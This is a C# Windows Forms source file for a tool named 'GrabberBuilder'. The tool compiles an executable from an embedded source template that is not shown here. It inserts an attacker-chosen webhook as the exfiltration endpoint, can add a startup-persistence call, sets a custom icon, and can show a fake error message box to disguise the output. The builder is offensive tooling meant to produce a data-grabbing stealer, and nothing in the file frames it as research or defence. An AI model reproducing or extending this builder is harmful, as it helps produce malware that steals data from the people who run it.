using System;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

namespace GrabberBuilder
{

    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        string src = Properties.Resources.stringSource;
        bool buttonAdd = false;
        public Form1()
        {
            
            InitializeComponent();
        }

        private void metroButton2_Click(object sender, EventArgs e) // browse button for .ico
        {
            using( OpenFileDialog x = new OpenFileDialog())
            {
                x.Filter = "ico file (*.ico)|*.ico";
                if (x.ShowDialog() == DialogResult.OK)
                {
                    metroTextBox3.Text = x.FileName;
                }
                else
                {
                    metroTextBox3.Clear();
                }
            }
        }

        private void metroButton3_Click(object sender, EventArgs e) // compile build button
        {
            textBox1.Text = textBox1.Text + Environment.NewLine + "Attempting to compile file..";
            Console.WriteLine("Webhook: " + metroTextBox2.Text);
            src = src.Replace("%INSERT_WEBHOOK%", metroTextBox2.Text);
            
            if (!buttonAdd)
            {
                src = src.Replace("%CODE_BLOCK_1%", "");
            }
            if (!metroCheckBox3.Checked)
            {
                src = src.Replace("%CODE_BLOCK_2%", "");
            }

            Console.WriteLine(src);
            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            ICodeCompiler icc = codeProvider.CreateCompiler();
            
            string output = "output.exe";
            if (!String.IsNullOrEmpty(metroTextBox4.Text))
            {
                output = metroTextBox4.Text + ".exe";
            }

            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = output;
            
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("mscorlib.dll");

            if (!String.IsNullOrEmpty(metroTextBox3.Text))
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + metroTextBox3.Text + "\"";
            }
    
            CompilerResults results = icc.CompileAssemblyFromSource(parameters,src);
        
            if (results.Errors.Count > 0)
            {
                foreach (CompilerError CompErr in results.Errors)
                {
                    textBox1.Text = textBox1.Text + Environment.NewLine +
                                "Line number " + CompErr.Line +
                                ", Error Number: " + CompErr.ErrorNumber +
                                ", '" + CompErr.ErrorText + ";";
                }
                textBox1.Text = textBox1.Text + Environment.NewLine + "An error has occured when trying to compile file.";
            }
            else
            {
                textBox1.Text = textBox1.Text + Environment.NewLine + "Successfully compiled file!" + Environment.NewLine + "Task has been completed. You may now check the folder where this application is located for the output.";
            }
        }

        private void metroButton1_Click(object sender, EventArgs e) // test button
        {
            string testWebhook = metroTextBox2.Text;
            Webhook wh = new Webhook(testWebhook);
            wh.Send("Webhook is working.");
        }

        private void metroCheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            src = src.Replace("%CODE_BLOCK_2%", "StartUp();");
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            buttonAdd = true;
            try
            {
                src = src.Replace("%CODE_BLOCK_1%", $"new Thread(() => MessageBox.Show(\"{metroTextBox5.Text}\", \"{metroTextBox1.Text}\", MessageBoxButtons.OK, MessageBoxIcon.Error)).Start();");
            }
            catch
            {

            }
        }
    }
}
